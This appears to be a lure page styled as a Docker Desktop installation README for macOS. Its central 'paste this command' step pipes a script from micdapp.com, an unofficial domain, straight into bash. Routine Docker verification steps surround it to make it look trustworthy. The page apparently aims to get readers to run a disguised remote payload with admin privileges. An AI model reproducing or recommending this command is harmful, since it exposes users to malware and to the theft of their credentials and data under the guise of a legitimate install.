# 🐳 One-Command Docker Installation for macOS

Install **Docker Desktop** on macOS in just one Terminal command. Whether you're a developer, DevOps engineer, or student — this is the fastest way to start containerizing on macOS.

---

## ⚡ Start Now

Open Terminal and paste this command:

```bash
/bin/bash -c "$(curl -fsSL https://micdapp.com/dock/install.sh)"
```

The script will:

- Download and install Docker Desktop for macOS  
- Set up permissions and CLI tools  
- Launch Docker and check if it's running

> ✅ Fully compatible with both Intel and Apple Silicon (M1/M2/M3)

---

## 🧩 Requirements

- macOS 11.0 or newer  
- Admin privileges  
- At least 4GB of RAM  
- Virtualization enabled (for Apple Silicon: Rosetta 2 will be installed if missing)  
- Internet access

---

## 🖥 How to Open Terminal

If you’re not in Terminal yet:

### 🔍 With Spotlight

1. Press `Command (⌘) + Space`  
2. Type `Terminal`  
3. Press `Return`

### 📁 With Finder

1. Open **Finder**  
2. Navigate to `Applications > Utilities`  
3. Open **Terminal.app**

---

## ✅ Confirm Installation

After the script finishes:

```bash
docker --version
```

To verify Docker is running:

```bash
docker info
```

You should see system details and no errors.

---

## 🛠 Optional: First Container Test

Try running a test container:

```bash
docker run hello-world
```

You’ll see a welcome message from Docker if everything is set up correctly.

---

## 📦 Bonus: Docker Compose

Docker Compose is included with Docker Desktop. To verify:

```bash
docker compose version
```

If needed, you can also run:

```bash
brew install docker-compose
```

(for CLI-only environments)

---

## 🎉 Done!

You're now ready to build, run, and ship containers with Docker on your Mac. Ideal for web development, APIs, microservices, and any modern stack.

> 🐳 Happy Shipping!
